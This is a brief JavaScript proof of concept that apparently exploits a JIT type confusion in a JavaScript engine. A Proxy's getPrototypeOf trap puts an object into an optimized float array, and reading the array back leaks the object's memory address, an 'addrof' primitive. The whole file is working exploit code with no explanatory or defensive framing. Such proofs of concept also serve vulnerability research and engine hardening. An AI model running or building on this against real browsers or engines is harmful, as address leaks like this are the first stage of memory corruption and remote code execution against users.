var objToLeak = {};		// We will leak the address of this object.
	
flag = 0;

var evilObj = new Proxy({},{
		getPrototypeOf:function(){
			if(flag == 1){
				a[0] = objToLeak;
			}
			return {};
		}
	});

function func(a){
	a[0] = 1.2;
	evilObj instanceof Array;
	a[1] = 2.2;
	return a[0];
}

a =[1.1,2.2];
for(var i = 0;i < 0x10000;i++){
	func(a);
}
flag = 1;
print(func(a));